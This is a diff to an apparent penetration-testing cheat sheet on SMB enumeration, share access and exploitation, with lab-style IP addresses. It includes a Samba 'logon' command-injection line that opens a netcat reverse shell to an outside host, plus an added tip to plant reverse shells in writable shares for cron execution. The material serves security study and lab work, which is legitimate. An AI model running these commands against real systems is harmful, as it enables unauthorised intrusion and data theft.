@@ -510,25 +510,41 @@ msf > use exploit/windows/dcerpc/ms03_026_dcom
 
 ```
 # Enum hostname
-enum4linux -n 10.11.1.111
-nmblookup -A 10.11.1.111
-nmap --script=smb-enum* --script-args=unsafe=1 -T5 10.11.1.111
+	enum4linux -n 10.11.1.111
+	nmblookup -A 10.11.1.111
+	nmap --script=smb-enum* --script-args=unsafe=1 -T5 10.11.1.111
 
 # Get Version
-smbver.sh 10.11.1.111
+	smbver.sh 10.11.1.111
+
 # Get smb_version
 	sudo Msfconsole -x "use scanner/smb/smb_version; set RHOSTS 192.168.X.X; run"
+
 ngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]'
+
 smbclient -L \\\\10.11.1.111
 
+# Connect To Share
+
+	smbclient //192.168.x.x/$SHARENAME
+
+# Useful commands inside of share
+	1) ls -al
+	2) dir
+	3) cd
+	4) put
+
+# Uploading file to share via curl. Requires creds
+
+	curl --upload-file /path/to/file.ext  -u 'DOMAIN\Username' smb://192.168.x.x/ShareName/
 # Get Shares
-smbmap -H  10.11.1.111 -R <sharename>
-sudo smbmap -H 10.11.1.136 -R --download "Bob Share\Draft Contract Mr. Yamamoto.txt" # Connect to a share with a space & download files
-echo exit | smbclient -L \\\\10.11.1.111
-smbclient \\\\10.11.1.111\\<share>
-smbclient -L //10.11.1.111 -N
-nmap --script smb-enum-shares -p139,445 -T4 -Pn 10.11.1.111
-smbclient -L \\\\10.11.1.111\\
+	smbmap -H  10.11.1.111 -R <sharename>
+	sudo smbmap -H 10.11.1.136 -R --download "Bob Share\Draft Contract Mr. Yamamoto.txt" # Connect to a share with a space & download files
+	echo exit | smbclient -L \\\\10.11.1.111
+	smbclient \\\\10.11.1.111\\<share>
+	smbclient -L //10.11.1.111 -N
+	nmap --script smb-enum-shares -p139,445 -T4 -Pn 10.11.1.111
+	smbclient -L \\\\10.11.1.111\\
 
 # Check null sessions
 smbmap -H 10.11.1.111
@@ -595,6 +611,9 @@ winexe -U username //10.11.1.111 "cmd.exe" --system
 
 #smb reverse shell with "logon" cmd
 logon "/=`nc 10.10.14.5 4444 -e /bin/bash`"
+
+# General SMB Tips
+	If you find a writable folder, upload reverse shells to it. It might get executed by a cronjob
 
 # smbmap
 smbmap.py -H 10.11.1.111 -u administrator -p asdf1234 #Enum
